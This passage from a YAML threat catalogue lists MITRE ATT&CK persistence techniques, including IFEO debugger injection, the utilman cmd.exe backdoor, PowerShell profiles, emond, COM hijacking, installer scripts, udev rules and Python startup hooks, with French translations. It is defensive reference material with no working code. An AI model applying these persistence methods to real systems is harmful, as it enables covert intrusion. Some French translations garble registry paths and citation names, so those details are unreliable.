          \ malveillants tels que l\u2019\xE9l\xE9vation de privil\xE8ges, l\u2019\
          installation de portes d\xE9rob\xE9es, la d\xE9sactivation de d\xE9fenses\
          \ comme Windows Defender, etc. (Citation : Scintillement de l\u2019application\
          \ FireEye) Les cales peuvent \xE9galement \xEAtre abus\xE9es pour \xE9tablir\
          \ leur persistance en \xE9tant continuellement invoqu\xE9es par les programmes\
          \ concern\xE9s.\nhttps://attack.mitre.org/techniques/T1546/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.012
    ref_id: T1546.012
    name: Image File Execution Options Injection
    description: "Adversaries may establish persistence and/or elevate privileges\
      \ by executing malicious content triggered by Image File Execution Options (IFEO)\
      \ debuggers. IFEOs enable a developer to attach a debugger to an application.\
      \ When a process is created, a debugger present in an application\u2019s IFEO\
      \ will be prepended to the application\u2019s name, effectively launching the\
      \ new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>).(Citation:\
      \ Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry\
      \ or in Global Flags via the GFlags tool.(Citation: Microsoft GFlags Mar 2017)\
      \ IFEOs are represented as <code>Debugger</code> values in the Registry under\
      \ <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\\
      Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code>\
      \ is the binary on which the debugger is attached.(Citation: Microsoft Dev Blog\
      \ IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be\
      \ launched when a specified program silently exits (i.e. is prematurely terminated\
      \ by itself or a second, non kernel-mode process).(Citation: Microsoft Silent\
      \ Process Exit NOV 2017)(Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers,\
      \ silent exit monitoring can be enabled through GFlags and/or by directly modifying\
      \ IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\\
      SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>.(Citation:\
      \ Microsoft Silent Process Exit NOV 2017)(Citation: Oddvar Moe IFEO APR 2018)\n\
      \nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008),\
      \ on Windows Vista and later as well as Windows Server 2008 and later, a Registry\
      \ key may be modified that configures \"cmd.exe,\" or another program that provides\
      \ backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe).\
      \ After the Registry is modified, pressing the appropriate key combination at\
      \ the login screen while at the keyboard or when connected with [Remote Desktop\
      \ Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"\
      debugger\" program to be executed with SYSTEM privileges.(Citation: Tilbury\
      \ 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055),\
      \ these values may also be abused to obtain privilege escalation by causing\
      \ a malicious executable to be loaded and run in the context of separate processes\
      \ on the computer.(Citation: Elastic Process Injection July 2017) Installing\
      \ IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\
      \nMalware may also use IFEO to impair defenses by registering invalid debuggers\
      \ that redirect and effectively disable various system and security applications.(Citation:\
      \ FSecure Hupigon)(Citation: Symantec Ushedix June 2008)\nhttps://attack.mitre.org/techniques/T1546/012"
    translations:
      fr:
        name: "Injection des options d\u2019ex\xE9cution de fichier image"
        description: "Les adversaires peuvent \xE9tablir la persistance et/ou augmenter\
          \ leurs privil\xE8ges en ex\xE9cutant du contenu malveillant d\xE9clench\xE9\
          \ par des d\xE9bogueurs IFEO (Image File Execution Options). Les IFEO permettent\
          \ \xE0 un d\xE9veloppeur d\u2019attacher un d\xE9bogueur \xE0 une application.\
          \ Lorsqu\u2019un processus est cr\xE9\xE9, un d\xE9bogueur pr\xE9sent dans\
          \ l\u2019IFEO d\u2019une application est pr\xE9c\xE9d\xE9 au nom de l\u2019\
          application, lan\xE7ant effectivement le nouveau processus sous le d\xE9\
          bogueur (par exemple, <code>C\_:\\dbg\\ntsd.exe -g notepad.exe</code>).\
          \ (Citation : Microsoft Dev Blog IFEO mars 2010)\n\nLes IFEO peuvent \xEA\
          tre configur\xE9s directement via le Registre ou dans Global Flags via l\u2019\
          outil GFlags. (Citation : Microsoft GFlags mars 2017) Les IFEO sont repr\xE9\
          sent\xE9s comme des valeurs <code>de d\xE9bogueur</code> dans le registre\
          \ sous <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\\
          Image File Execution Options\\<executable></code> o\xF9 <code>&lt;ex\xE9\
          cutable&gt;</code> est le binaire sur lequel le d\xE9bogueur est attach\xE9\
          .( Citation : Microsoft Dev Blog IFEO mars 2010)\n\nLes IFEO peuvent \xE9\
          galement permettre le lancement d\u2019un programme de surveillance arbitraire\
          \ lorsqu\u2019un programme sp\xE9cifi\xE9 se termine silencieusement (c\u2019\
          est-\xE0-dire qu\u2019il est termin\xE9 pr\xE9matur\xE9ment par lui-m\xEA\
          me ou par un second processus non en mode noyau). (Citation : Sortie du\
          \ processus silencieux Microsoft NOV 2017)(Citation : Oddvar Moe IFEO APR\
          \ 2018) \xC0 l\u2019instar des d\xE9bogueurs, la surveillance silencieuse\
          \ des sorties peut \xEAtre activ\xE9e via GFlags et/ou en modifiant directement\
          \ les valeurs IFEO et les valeurs silencieuses du registre de sortie de\
          \ processus dans <code>HKEY_LOCAL_MACHINE\\LOGICIEL\\Microsoft\\Windows\
          \ NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation : Sortie du\
          \ processus silencieux Microsoft NOV 2017)(Citation : Oddvar Moe IFEO APR\
          \ 2018)\n\n\xC0 l\u2019instar de [Accessibility Features](https://attack.mitre.org/techniques/T1546/008),\
          \ sur Windows Vista et versions ult\xE9rieures ainsi que sur Windows Server\
          \ 2008 et versions ult\xE9rieures, une cl\xE9 de registre peut \xEAtre modifi\xE9\
          e pour configurer \xAB cmd.exe \xBB, ou un autre programme offrant un acc\xE8\
          s par la porte d\xE9rob\xE9e, en tant que \xAB d\xE9bogueur \xBB pour un\
          \ programme d\u2019accessibilit\xE9 (ex. : utilman.exe). Apr\xE8s modification\
          \ du Registre, appuyer sur la combinaison de touches appropri\xE9e \xE0\
          \ l\u2019\xE9cran de connexion au clavier ou connect\xE9 au [Remote Desktop\
          \ Protocol](https://attack.mitre.org/techniques/T1021/001) provoque l\u2019\
          ex\xE9cution du programme \xAB d\xE9bogueur \xBB avec les privil\xE8ges\
          \ SYST\xC8ME. (Citation : Tilbury 2014)\n\n\xC0 l\u2019instar de [Process\
          \ Injection](https://attack.mitre.org/techniques/T1055), ces valeurs peuvent\
          \ \xE9galement \xEAtre abus\xE9es pour obtenir une escalade de privil\xE8\
          ges en provoquant le chargement et l\u2019ex\xE9cution d\u2019un ex\xE9\
          cutable malveillant dans le contexte de processus s\xE9par\xE9s sur l\u2019\
          ordinateur. (Citation : Injection de proc\xE9d\xE9 \xE9lastique juillet\
          \ 2017) L\u2019installation de m\xE9canismes IFEO peut \xE9galement fournir\
          \ une persistance via une invocation d\xE9clench\xE9e en continu.\n\nLes\
          \ logiciels malveillants peuvent \xE9galement utiliser l\u2019IFEO pour\
          \ compromettre les d\xE9fenses en enregistrant des d\xE9bogueurs invalides\
          \ qui redirigent et d\xE9sactivent efficacement diverses applications syst\xE8\
          me et de s\xE9curit\xE9. (Citation : FSecure Hupigon)(Citation : Symantec\
          \ Ushedix juin 2008)\nhttps://attack.mitre.org/techniques/T1546/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.013
    ref_id: T1546.013
    name: PowerShell Profile
    description: "Adversaries may gain persistence and elevate privileges by executing\
      \ malicious content triggered by PowerShell profiles. A PowerShell profile \
      \ (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ starts and can be used as a logon script to customize user environments.\n\
      \n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several\
      \ profiles depending on the user or host program. For example, there can be\
      \ different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ host programs such as the PowerShell console, PowerShell ISE or Visual Studio\
      \ Code. An administrator can also configure a profile that applies to all users\
      \ and host programs on the local computer. (Citation: Microsoft About Profiles)\
      \ \n\nAdversaries may modify these profiles to include arbitrary commands, functions,\
      \ modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ session the modified script will be executed unless the <code>-NoProfile</code>\
      \ flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019)\
      \ \n\nAn adversary may also be able to escalate privileges if a script in a\
      \ PowerShell profile is loaded and executed by an account with higher privileges,\
      \ such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)\n\
      https://attack.mitre.org/techniques/T1546/013"
    translations:
      fr:
        name: Profil PowerShell
        description: "Les adversaires peuvent gagner en persistance et augmenter leurs\
          \ privil\xE8ges en ex\xE9cutant du contenu malveillant d\xE9clench\xE9 par\
          \ des profils PowerShell. Un profil PowerShell (<code>profile.ps1</code>)\
          \ est un script qui s\u2019ex\xE9cute lorsque [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ d\xE9marre et peut \xEAtre utilis\xE9 comme script de connexion pour personnaliser\
          \ les environnements utilisateur.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ prend en charge plusieurs profils selon l\u2019utilisateur ou le programme\
          \ h\xF4te. Par exemple, il peut exister diff\xE9rents profils pour les programmes\
          \ h\xF4tes [PowerShell](https://attack.mitre.org/techniques/T1059/001) tels\
          \ que la console PowerShell, PowerShell ISE ou Visual Studio Code. Un administrateur\
          \ peut \xE9galement configurer un profil qui s\u2019applique \xE0 tous les\
          \ utilisateurs et programmes h\xF4tes sur l\u2019ordinateur local. (Citation\
          \ : Microsoft \xE0 propos des profils) \n\nLes adversaires peuvent modifier\
          \ ces profils pour inclure des commandes, fonctions, modules et/ou disques\
          \ [PowerShell](https://attack.mitre.org/techniques/T1059/001) arbitraires\
          \ afin d\u2019obtenir de la persistance. Chaque fois qu\u2019un utilisateur\
          \ ouvre une session [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
          \ le script modifi\xE9 sera ex\xE9cut\xE9, sauf si le drapeau <code>-NoProfile</code>\
          \ est utilis\xE9 lors de son lancement. (Citation : ESET Turla PowerShell\
          \ mai 2019) \n\nUn adversaire peut \xE9galement \xEAtre capable d\u2019\
          escalader des privil\xE8ges si un script dans un profil PowerShell est charg\xE9\
          \ et ex\xE9cut\xE9 par un compte disposant de privil\xE8ges sup\xE9rieurs,\
          \ comme un administrateur de domaine. (Citation : Profils PowerShell douteux\
          \ et de Wits End)\nhttps://attack.mitre.org/techniques/T1546/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.014
    ref_id: T1546.014
    name: Emond
    description: 'Adversaries may gain persistence and elevate privileges by executing
      malicious content triggered by the Event Monitor Daemon (emond). Emond is a
      [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts
      events from various services, runs them through a simple rules engine, and takes
      action. The emond binary at <code>/sbin/emond</code> will load any rules from
      the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly
      defined event takes place.


      The rule files are in the plist format and define the name, event type, and
      action to take. Some examples of event types include system startup and user
      authentication. Examples of actions are to run a system command or send an email.
      The emond service will not launch if there is no file present in the QueueDirectories
      path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)
      configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation:
      xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone
      macos persist Jun 2019)


      Adversaries may abuse this service by writing a rule to execute commands when
      a defined event occurs, such as system start up or user authentication.(Citation:
      xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone
      macos persist Jun 2019) Adversaries may also be able to escalate privileges
      from administrator to root as the emond service is executed with root privileges
      by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.

      https://attack.mitre.org/techniques/T1546/014'
    translations:
      fr:
        name: Emond
        description: "Les adversaires peuvent gagner en persistance et augmenter leurs\
          \ privil\xE8ges en ex\xE9cutant du contenu malveillant d\xE9clench\xE9 par\
          \ le d\xE9mon moniteur d\u2019\xE9v\xE9nements (emond). Emond est un [D\xE9\
          mon de Lancement](https://attack.mitre.org/techniques/T1543/004) qui accepte\
          \ les \xE9v\xE9nements de divers services, les fait passer par un simple\
          \ moteur de r\xE8gles et passe \xE0 l\u2019action. Le binaire emond \xE0\
          \ <code>/sbin/emond</code> chargera toutes les r\xE8gles depuis le r\xE9\
          pertoire <code>/etc/emond.d/rules/</code> et agira d\xE8s qu\u2019un \xE9\
          v\xE9nement explicitement d\xE9fini aura lieu.\n\nLes fichiers de r\xE8\
          gles sont au format plist et d\xE9finissent le nom, le type d\u2019\xE9\
          v\xE9nement et l\u2019action \xE0 entreprendre. Quelques exemples de types\
          \ d\u2019\xE9v\xE9nements incluent le d\xE9marrage du syst\xE8me et l\u2019\
          authentification utilisateur. Des exemples d\u2019actions sont d\u2019ex\xE9\
          cuter une commande syst\xE8me ou d\u2019envoyer un e-mail. Le service emond\
          \ ne se lance pas s\u2019il n\u2019y a pas de fichier pr\xE9sent dans le\
          \ chemin <code>QueueDirectories /private/var/db/emondClients</code>, sp\xE9\
          cifi\xE9 dans le fichier de configuration [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)\
          \ at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>. (Citation\
          \ : xorrior emond janv. 2018)(Citation : magnusviri emond avr. 2016)(Citation\
          \ : sentinelone macos persiste juin 2019)\n\nLes adversaires peuvent abuser\
          \ de ce service en \xE9crivant une r\xE8gle pour ex\xE9cuter des commandes\
          \ lorsqu\u2019un \xE9v\xE9nement d\xE9fini se produit, comme le d\xE9marrage\
          \ du syst\xE8me ou l\u2019authentification utilisateur. (Citation : xorrior\
          \ emond janv. 2018)(Citation : magnusviri emond avr. 2016)(Citation : sentinelone\
          \ macos persiste juin 2019) Les adversaires peuvent \xE9galement \xEAtre\
          \ capables d\u2019escalader les privil\xE8ges de l\u2019administrateur vers\
          \ la racine \xE0 mesure que le service emond est ex\xE9cut\xE9 avec des\
          \ privil\xE8ges root par le service [Launch Daemon](https://attack.mitre.org/techniques/T1543/004).\n\
          https://attack.mitre.org/techniques/T1546/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.015
    ref_id: T1546.015
    name: Component Object Model Hijacking
    description: "Adversaries may establish persistence by executing malicious content\
      \ triggered by hijacked references to Component Object Model (COM) objects.\
      \ COM is a system within Windows to enable interaction between software components\
      \ through the operating system.(Citation: Microsoft Component Object Model)\
      \  References to various COM objects are stored in the Registry. \n\nAdversaries\
      \ may use the COM system to insert malicious code that can be executed in place\
      \ of legitimate software through hijacking the COM references and relationships\
      \ as a means for persistence. Hijacking a COM object requires a change in the\
      \ Registry to replace a reference to a legitimate system component which may\
      \ cause that component to not work when executed. When that system component\
      \ is executed through normal system operation the adversary's code will be executed\
      \ instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects\
      \ that are used frequently enough to maintain a consistent level of persistence,\
      \ but are unlikely to break noticeable functionality within the system as to\
      \ avoid system instability that could lead to detection. \n\nOne variation of\
      \ COM hijacking involves abusing Type Libraries (TypeLibs), which provide metadata\
      \ about COM objects, such as their interfaces and methods. Adversaries may modify\
      \ Registry keys associated with TypeLibs to redirect legitimate COM object functionality\
      \ to malicious scripts or payloads. Unlike traditional COM hijacking, which\
      \ commonly uses local DLLs, this variation may leverage the \"script:\" moniker\
      \ to execute remote scripts hosted on external servers.(Citation: RELIAQUEST)\
      \ This approach enables stealthy execution of code while maintaining persistence,\
      \ as the remote payload would be automatically downloaded whenever the hijacked\
      \ COM object is accessed.\nhttps://attack.mitre.org/techniques/T1546/015"
    translations:
      fr:
        name: "D\xE9tournement du mod\xE8le d\u2019objet composant"
        description: "Les adversaires peuvent \xE9tablir la persistance en ex\xE9\
          cutant du contenu malveillant d\xE9clench\xE9 par des r\xE9f\xE9rences d\xE9\
          tourn\xE9es aux objets du Component Object Model (COM). COM est un syst\xE8\
          me int\xE9gr\xE9 \xE0 Windows permettant l\u2019interaction entre composants\
          \ logiciels via le syst\xE8me d\u2019exploitation. (Citation : Mod\xE8le\
          \ d\u2019objets composants Microsoft)  Les r\xE9f\xE9rences \xE0 divers\
          \ objets COM sont stock\xE9es dans le Registre. \n\nLes adversaires peuvent\
          \ utiliser le syst\xE8me COM pour ins\xE9rer du code malveillant qui peut\
          \ \xEAtre ex\xE9cut\xE9 \xE0 la place d\u2019un logiciel l\xE9gitime en\
          \ d\xE9tournant les r\xE9f\xE9rences et relations COM comme moyen de persistance.\
          \ Le d\xE9tournement d\u2019un objet COM n\xE9cessite un changement dans\
          \ le registre pour remplacer une r\xE9f\xE9rence \xE0 un composant syst\xE8\
          me l\xE9gitime, ce qui peut emp\xEAcher ce composant de fonctionner lors\
          \ de son ex\xE9cution. Lorsque ce composant syst\xE8me est ex\xE9cut\xE9\
          \ par fonctionnement normal, le code de l\u2019adversaire sera ex\xE9cut\xE9\
          \ \xE0 la place. (Citation : D\xE9tournement du GDATA COM) Un adversaire\
          \ est susceptible de d\xE9tourner des objets utilis\xE9s assez fr\xE9quemment\
          \ pour maintenir un niveau de persistance constant, mais qui est peu susceptible\
          \ de casser des fonctionnalit\xE9s visibles dans le syst\xE8me afin d\u2019\
          \xE9viter une instabilit\xE9 pouvant entra\xEEner une d\xE9tection. \n\n\
          Une variante du d\xE9tournement COM implique l\u2019abus des biblioth\xE8\
          ques de types (TypeLibs), qui fournissent des m\xE9tadonn\xE9es sur les\
          \ objets COM, tels que leurs interfaces et m\xE9thodes. Les adversaires\
          \ peuvent modifier les cl\xE9s du registre associ\xE9es aux TypeLibs pour\
          \ rediriger la fonctionnalit\xE9 l\xE9gitime des objets COM vers des scripts\
          \ ou charges utiles malveillantes. Contrairement au d\xE9tournement COM\
          \ traditionnel, qui utilise couramment des DLL locaux, cette variante peut\
          \ exploiter le terme \xAB script\_:\_\xBB pour ex\xE9cuter des scripts distants\
          \ h\xE9berg\xE9s sur des serveurs externes. (Citation : RELIAQUEST) Cette\
          \ approche permet une ex\xE9cution furtive du code tout en maintenant la\
          \ persistance, car la charge utile distante serait automatiquement t\xE9\
          l\xE9charg\xE9e chaque fois que l\u2019objet COM d\xE9tourn\xE9 est acc\xE9\
          d\xE9.\nhttps://attack.mitre.org/techniques/T1546/015"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.016
    ref_id: T1546.016
    name: Installer Packages
    description: 'Adversaries may establish persistence and elevate privileges by
      using an installer to trigger the execution of malicious content. Installer
      packages are OS specific and contain the resources an operating system needs
      to install applications on a system. Installer packages can include scripts
      that run prior to installation as well as after installation is complete. Installer
      scripts may inherit elevated permissions when executed. Developers often use
      these scripts to prepare the environment for installation, check requirements,
      download dependencies, and remove files after installation.(Citation: Installer
      Package Scripting Rich Trouton)


      Using legitimate applications, adversaries have distributed applications with
      modified installer scripts to execute malicious content. When a user installs
      the application, they may be required to grant administrative permissions to
      allow the installation. At the end of the installation process of the legitimate
      application, content such as macOS `postinstall` scripts can be executed with
      the inherited elevated permissions. Adversaries can use these scripts to execute
      a malicious executable or install other malicious components (such as a [Launch
      Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation:
      Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)(Citation:
      Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)


      Depending on the distribution, Linux versions of package installer scripts are
      sometimes called maintainer scripts or post installation scripts. These scripts
      can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root
      when executed.


      For Windows, the Microsoft Installer services uses `.msi` files to manage the
      installing, updating, and uninstalling of applications. These installation routines
      may also include instructions to perform additional actions that may be abused
      by adversaries.(Citation: Microsoft Installation Procedures)

      https://attack.mitre.org/techniques/T1546/016'
    translations:
      fr:
        name: "Paquets d\u2019installation"
        description: "Les adversaires peuvent \xE9tablir la persistance et augmenter\
          \ leurs privil\xE8ges en utilisant un installateur pour d\xE9clencher l\u2019\
          ex\xE9cution de contenu malveillant. Les packages d\u2019installation sont\
          \ sp\xE9cifiques au syst\xE8me d\u2019exploitation et contiennent les ressources\
          \ dont un syst\xE8me d\u2019exploitation a besoin pour installer des applications\
          \ sur un syst\xE8me. Les packages d\u2019installation peuvent inclure des\
          \ scripts qui s\u2019ex\xE9cutent avant l\u2019installation ainsi qu\u2019\
          apr\xE8s l\u2019installation. Les scripts d\u2019installation peuvent h\xE9\
          riter des permissions \xE9lev\xE9es lors de leur ex\xE9cution. Les d\xE9\
          veloppeurs utilisent souvent ces scripts pour pr\xE9parer l\u2019environnement\
          \ \xE0 l\u2019installation, v\xE9rifier les exigences, t\xE9l\xE9charger\
          \ les d\xE9pendances et supprimer les fichiers apr\xE8s l\u2019installation.\
          \ (Citation : Script de paquet d\u2019installateur Rich Trouton)\n\nEn utilisant\
          \ des applications l\xE9gitimes, les adversaires ont distribu\xE9 des applications\
          \ avec des scripts d\u2019installation modifi\xE9s pour ex\xE9cuter du contenu\
          \ malveillant. Lorsqu\u2019un utilisateur installe l\u2019application, il\
          \ peut \xEAtre amen\xE9 \xE0 accorder des autorisations administratives\
          \ pour permettre l\u2019installation. \xC0 la fin du processus d\u2019installation\
          \ de l\u2019application l\xE9gitime, du contenu tel que les scripts \xAB\
          \ postinstall \xBB de macOS peut \xEAtre ex\xE9cut\xE9 avec les permissions\
          \ \xE9lev\xE9es h\xE9rit\xE9es. Les adversaires peuvent utiliser ces scripts\
          \ pour ex\xE9cuter un ex\xE9cutable malveillant ou installer d\u2019autres\
          \ composants malveillants (comme un [D\xE9mon de lancement](https://attack.mitre.org/techniques/T1543/004))\
          \ avec les permissions \xE9lev\xE9es. (Citation : Manipulation du bundle\
          \ d\u2019applications Brandon Dalton)(Citation : wardle evilquest parti)(Citation\
          \ : Windows AppleJeus GReAT)(Citation : Scripts de maintenance du manuel\
          \ Debian)\n\nSelon la distribution, les versions Linux des scripts d\u2019\
          installation de paquets sont parfois appel\xE9es scripts de maintenance\
          \ ou scripts post-installation. Ces scripts peuvent inclure les scripts\
          \ 'preinst', 'postinst', 'prerm', 'postrm' et s\u2019ex\xE9cuter en racine\
          \ lors de leur ex\xE9cution.\n\nPour Windows, les services Microsoft Installer\
          \ utilisent des fichiers \xAB .msi \xBB pour g\xE9rer l\u2019installation,\
          \ la mise \xE0 jour et la d\xE9sinstallation des applications. Ces routines\
          \ d\u2019installation peuvent \xE9galement inclure des instructions pour\
          \ effectuer des actions suppl\xE9mentaires qui pourraient \xEAtre abus\xE9\
          es par les adversaires. (Citation : Proc\xE9dures d\u2019installation Microsoft)\n\
          https://attack.mitre.org/techniques/T1546/016"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.017
    ref_id: T1546.017
    name: Udev Rules
    description: "Adversaries may maintain persistence through executing malicious\
      \ content triggered using udev rules. Udev is the Linux kernel device manager\
      \ that dynamically manages device nodes, handles access to pseudo-device files\
      \ in the `/dev` directory, and responds to hardware events, such as when external\
      \ devices like hard drives or keyboards are plugged in or removed. Udev uses\
      \ rule files with `match keys` to specify the conditions a hardware event must\
      \ meet and `action keys` to define the actions that should follow. Root permissions\
      \ are required to create, modify, or delete rule files located in `/etc/udev/rules.d/`,\
      \ `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`,\
      \ and `/lib/udev/rules.d/`. Rule priority is determined by both directory and\
      \ by the digit prefix in the rule filename.(Citation: Ignacio Udev research\
      \ 2024)(Citation: Elastic Linux Persistence 2024)\n\nAdversaries may abuse the\
      \ udev subsystem by adding or modifying rules in udev rule files to execute\
      \ malicious content. For example, an adversary may configure a rule to execute\
      \ their binary each time the pseudo-device file, such as `/dev/random`, is accessed\
      \ by an application. Although udev is limited to running short tasks and is\
      \ restricted by systemd-udevd's sandbox (blocking network and filesystem access),\
      \ attackers may use scripting commands under the action key `RUN+=` to detach\
      \ and run the malicious content\u2019s process in the background to bypass these\
      \ controls.(Citation: Reichert aon sedexp 2024)\nhttps://attack.mitre.org/techniques/T1546/017"
    translations:
      fr:
        name: "R\xE8gles Udev"
        description: "Les adversaires peuvent maintenir leur persistance en ex\xE9\
          cutant du contenu malveillant d\xE9clench\xE9 \xE0 l\u2019aide des r\xE8\
          gles udev. Udev est le gestionnaire de p\xE9riph\xE9riques du noyau Linux\
          \ qui g\xE8re dynamiquement les n\u0153uds de p\xE9riph\xE9riques, g\xE8\
          re l\u2019acc\xE8s aux fichiers pseudo-p\xE9riph\xE9riques dans le dossier\
          \ '/dev', et r\xE9agit aux \xE9v\xE9nements mat\xE9riels, comme lorsque\
          \ des p\xE9riph\xE9riques externes comme des disques durs ou des claviers\
          \ sont branch\xE9s ou retir\xE9s. Udev utilise des fichiers de r\xE8gles\
          \ avec des \xAB cl\xE9s de correspondance \xBB pour sp\xE9cifier les conditions\
          \ qu\u2019un \xE9v\xE9nement mat\xE9riel doit remplir et des \xAB cl\xE9\
          s d\u2019action \xBB pour d\xE9finir les actions \xE0 suivre. Les permissions\
          \ root sont requises pour cr\xE9er, modifier ou supprimer des fichiers de\
          \ r\xE8gles situ\xE9s dans '/etc/udev/rules.d/', '/run/udev/rules.d/', '/usr/lib/udev/rules.d/',\
          \ '/usr/local/lib/udev/rules.d/', et '/lib/udev/rules.d/'. La priorit\xE9\
          \ des r\xE8gles est d\xE9termin\xE9e \xE0 la fois par le r\xE9pertoire et\
          \ par le pr\xE9fixe du chiffre dans le nom du fichier de r\xE8gle. (Citation\
          \ : recherche d\u2019Ignacio Udev 2024)(Citation : Elastic Linux Persistence\
          \ 2024)\n\nLes adversaires peuvent abuser du sous-syst\xE8me udev en ajoutant\
          \ ou en modifiant des r\xE8gles dans les fichiers de r\xE8gles udev pour\
          \ ex\xE9cuter du contenu malveillant. Par exemple, un adversaire peut configurer\
          \ une r\xE8gle pour ex\xE9cuter son binaire chaque fois qu\u2019un fichier\
          \ pseudo-appareil, tel que \xAB /dev/random \xBB, est acc\xE9d\xE9 par une\
          \ application. Bien qu\u2019udev soit limit\xE9 \xE0 ex\xE9cuter de courtes\
          \ t\xE2ches et soit limit\xE9 par le bac \xE0 sable de systemd-udevd (bloquant\
          \ l\u2019acc\xE8s r\xE9seau et syst\xE8me de fichiers), les attaquants peuvent\
          \ utiliser des commandes de script sous la cl\xE9 d\u2019action 'RUN+='\
          \ pour d\xE9tacher et ex\xE9cuter le processus du contenu malveillant en\
          \ arri\xE8re-plan afin de contourner ces contr\xF4les. (Citation : Reichert\
          \ aon sedexp 2024)\nhttps://attack.mitre.org/techniques/T1546/017"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.018
    ref_id: T1546.018
    name: Python Startup Hooks
    description: "Adversaries may achieve persistence by leveraging Python\u2019s\
      \ startup mechanisms, including path configuration (`.pth`) files and the `sitecustomize.py`\
      \ or `usercustomize.py` modules. These files are automatically processed during\
      \ the initialization of the Python interpreter, allowing for the execution of\
      \ arbitrary code whenever Python is invoked.(Citation: Volexity GlobalProtect\
      \ CVE 2024)\n\nPath configuration files are designed to extend Python\u2019\
      s module search paths through the use of import statements. If a `.pth` file\
      \ is placed in Python's `site-packages` or `dist-packages` directories, any\
      \ lines beginning with `import` will be executed automatically on Python invocation.(Citation:\
      \ DFIR Python Persistence 2025) Similarly, if `sitecustomize.py` or `usercustomize.py`\
      \ is present in the Python path, these files will be imported during interpreter\
      \ startup, and any code they contain will be executed.(Citation: Python Site\
      \ Configuration Hook)\n\nAdversaries may abuse these mechanisms to establish\
      \ persistence on systems where Python is widely used (e.g., for automation or\
      \ scripting in production environments).\nhttps://attack.mitre.org/techniques/T1546/018"
    translations:
      fr:
        name: "Accroches de d\xE9marrage Python"
        description: "Les adversaires peuvent obtenir la persistance en tirant parti\
          \ des m\xE9canismes de d\xE9marrage de Python, y compris les fichiers de\
          \ configuration de chemin ('.pth') et les modules 'sitecustomize.py' ou\
          \ 'usercustomize.py'. Ces fichiers sont automatiquement trait\xE9s lors\
          \ de l\u2019initialisation de l\u2019interpr\xE9teur Python, permettant\
          \ l\u2019ex\xE9cution de code arbitraire chaque fois que Python est invoqu\xE9\
          . (Citation : Volexity GlobalProtect CVE 2024)\n\nLes fichiers de configuration\
          \ de chemin sont con\xE7us pour \xE9tendre les chemins de recherche de modules\
          \ de Python gr\xE2ce \xE0 l\u2019utilisation d\u2019instructions d\u2019\
          importation. Si un fichier '.pth' est plac\xE9 dans les r\xE9pertoires 'site-packages'\
          \ ou 'dist-packages' de Python, toutes les lignes commen\xE7ant par 'import'\
          \ seront ex\xE9cut\xE9es automatiquement lors de l\u2019invocation Python.\
          \ (Citation : DFIR Python Persistence 2025) De m\xEAme, si 'sitecustomize.py'\
          \ ou 'usercustomize.py' sont pr\xE9sents dans le chemin Python, ces fichiers\
          \ seront import\xE9s lors du d\xE9marrage de l\u2019interpr\xE9teur, et\
          \ tout code qu\u2019ils contiennent sera ex\xE9cut\xE9. (Citation : Crochet\
          \ de configuration du site Python)\n\nLes adversaires peuvent abuser de\
          \ ces m\xE9canismes pour \xE9tablir une persistance sur des syst\xE8mes\
          \ o\xF9 Python est largement utilis\xE9 (par exemple, pour l\u2019automatisation\
          \ ou le scripting en production).\nhttps://attack.mitre.org/techniques/T1546/018"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547
    ref_id: T1547
    name: Boot or Logon Autostart Execution
    description: 'Adversaries may configure system settings to automatically execute
      a program during system boot or logon to maintain persistence or gain higher-level
      privileges on compromised systems. Operating systems may have mechanisms for
